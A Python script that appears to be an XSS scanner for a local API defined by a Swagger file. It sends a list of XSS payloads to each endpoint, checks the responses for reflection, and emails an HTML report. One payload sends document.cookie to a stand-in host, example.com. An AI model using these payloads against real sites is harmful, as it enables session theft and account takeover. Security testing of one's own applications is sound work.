import yaml
import re
import html
import requests
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText

swagger_file_path = "swagger.yml"
base_url = "http://localhost:8000/api"
recipient_email = "sinaubib@gmail.com"

# XSS payloads
xss_payloads = [
    "<script>alert('XSS');</script>",
    "<img src='invalid-image' onerror='alert(\"XSS\");'>",
    "<a href='javascript:alert(\"XSS\")'>Click me</a>",
    "<form onsubmit='alert(\"XSS\")'><input type='submit'></form>",
    "<div onmouseover='alert(\"XSS\")'>Hover over me</div>",
    "<script>var img = new Image(); img.src = 'http://example.com/cookie?c=' + document.cookie;</script>",
    "<iframe src='http://example.com'></iframe>",
    "<input type='text' value='XSS' onfocus='alert(\"XSS\");'>",
    "<style>body {background-image: url(\"javascript:alert('XSS')\");}</style>"
]

# Function to parse Swagger file
def parse_swagger(file_path):
    with open(file_path, 'r') as file:
        swagger_data = yaml.safe_load(file)
    endpoints = []
    x_body_name = ""
    for path, methods in swagger_data['paths'].items():
        for method, details in methods.items():
            if 'requestBody' in details:
                content = details['requestBody'].get('content', {})
                if 'application/json' in content:
                    schema = content['application/json'].get('schema', {})
                    x_body_name = schema.get('x-body-name')
        endpoints.append({'path': path, 'method': method, 'details': details, 'x_body_name': x_body_name})
    return endpoints

def get_parameter(x_body):
    with open(swagger_file_path, 'r') as file:
        swagger_data = yaml.safe_load(file)
    components = swagger_data.get('components', {})
    x_schema = []

    if 'schemas' in components and x_body in components['schemas']:
        x_schema = components['schemas'][x_body].get('required', [])
    return x_schema

# Function to test XSS vulnerability in request body
def test_xss(endpoint, base_url):
    url = f"{base_url}{endpoint['path']}"
    x_body = endpoint['x_body_name']
    parameters = get_parameter(x_body)
    results = []
    headers = {"Content-Type": "application/json"}
    for payload in xss_payloads:
        try:
            for parameter in parameters:
                data = {parameter: payload}  # Need to be enhanced
                if endpoint['method'].lower() == "post":
                    response = requests.post(url, json=data, headers=headers)
                    print(f"Testing url {url} in parameter {parameter} with payload: {payload}")
                else:
                    response = requests.request(endpoint['method'], url, params=data)
                
                if re.search(re.escape(payload), response.text, re.IGNORECASE):
                    results.append(f"XSS Vulnerability <b>Found</b> at {url} in parameter <b>{parameter}</b> with payload: {html.escape(payload)}")
                else:
                    results.append(f"No XSS Vulnerability at {url}")
        except requests.exceptions.RequestException as e:
            results.append(f"Error testing {url} with payload: {html.escape(payload)} - {e}")
    return results

# Function to generate HTML report
def generate_report(results):
    report = "<html><body><h1>XSS Vulnerability Report</h1><ul>"
    for result in results:
        report += f"<li>{result}</li>"
    report += "</ul></body></html>"
    return report

# Function to send email
def send_email(report, recipient_email):
    sender_email = "sinaubib@gmail.com"
    sender_password = "insert_your_password"

    msg = MIMEMultipart()
    msg['From'] = sender_email
    msg['To'] = recipient_email
    msg['Subject'] = "XSS Vulnerability Report"

    msg.attach(MIMEText(report, 'html'))

    try:
        server = smtplib.SMTP('smtp.gmail.com', 587)
        server.starttls()
        server.login(sender_email, sender_password)
        server.sendmail(sender_email, recipient_email, msg.as_string())
        server.quit()
        print(f"Send the report to email: {recipient_email}")
    except Exception as e:
        print(f"Failed to send email: {e}")

# Main function
def main():
    endpoints = parse_swagger(swagger_file_path)
    results = []

    for endpoint in endpoints:
        result = test_xss(endpoint, base_url)
        results.extend(result)

    report = generate_report(results)
    send_email(report, recipient_email)

if __name__ == "__main__":
    main()
